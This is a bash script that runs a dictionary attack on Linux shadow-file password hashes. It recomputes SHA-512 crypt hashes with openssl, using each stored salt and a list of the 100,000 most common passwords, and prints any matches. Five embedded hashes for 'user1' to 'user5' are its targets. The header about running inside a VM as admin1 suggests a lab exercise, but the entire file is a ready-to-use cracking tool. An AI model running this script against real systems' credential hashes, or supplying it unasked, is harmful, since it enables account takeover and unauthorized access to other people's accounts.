#!/bin/bash 

# =============================================
# CRACK ALL USERS - Run inside VM as admin1
# =============================================

WORDLIST="/home/admin1/100k-most-used-passwords-NIST.txt"

# Fix Windows line endings
sed -i 's/\r//' "$WORDLIST"

echo "########################################"
echo "#   CRACKING ALL USER PASSWORDS        #"
echo "########################################"

crack_hash() {
    local USERNAME="$1"
    local SHADOW_HASH="$2"
    local SALT=$(echo "$SHADOW_HASH" | cut -d'$' -f3)

    echo ""
    echo "-----------------------------"
    echo " User : $USERNAME"
    echo " Salt : $SALT"
    echo " Cracking..."
    echo "-----------------------------"

    local COUNT=0
    while IFS= read -r PASS; do
        [[ -z "$PASS" ]] && continue
        COUNT=$((COUNT+1))
        local GEN=$(openssl passwd -6 -salt "$SALT" "$PASS" 2>/dev/null)
        (( COUNT % 1000 == 0 )) && echo -ne "[*] Tried $COUNT passwords...\r"
        if [[ "$GEN" == "$SHADOW_HASH" ]]; then
            echo ""
            echo "=============================="
            echo "[+] $USERNAME PASSWORD: $PASS"
            echo "[+] Total tried: $COUNT"
            echo "=============================="
            return 0
        fi
    done < "$WORDLIST"
    echo "[-] $USERNAME : Not found"
}

# Crack all users
crack_hash "user1" '$6$2Ff.cb1r$QuoNFOAme5xy5/anjAsZVIDrZdBKZ.hZ6UIIdLU9D4DDEs30.CbRsICaVxxdQ0TG2TOHYSHDwfdsrGOWGsXVB/'
crack_hash "user2" '$6$zZKc4n0X$Rac9mB17TLeFgE/TOH0gTgRnAmaNk67ezuZo4fQA0Sku1EKrrW6sum0uE1LvmAeBqhf0k/jCYn2dddJCC0QzI1'
crack_hash "user3" '$6$dCPTizMy$b8Fiueet0w08JR66mI3UPg.U7ertejWDHTDCAyqbVSjhhLgTu8N2/51R496408q356m.gmJSjG.u89L.3K8HH.'
crack_hash "user4" '$6$0Ptm7uW6$9cY0Hvx3S6dJBgK42hVq.bPHJ1aMH.KV/59bsX2UYVSBp6RUit6KKFLnuoKz5L5yHHH75Y2ymLci19uBhV4XW.'
crack_hash "user5" '$6$QpU0v3n/$Z5BKWAKu6Ss2MI4KStZm1R/IZuhE9Ts.cezqBca3iApKmbT/GSBC1GUHf0I0mmyt0dmqzc1HKt47idGnpmHoe0'

echo ""
echo "########################################"
echo "#         ALL DONE!                    #"
echo "########################################"
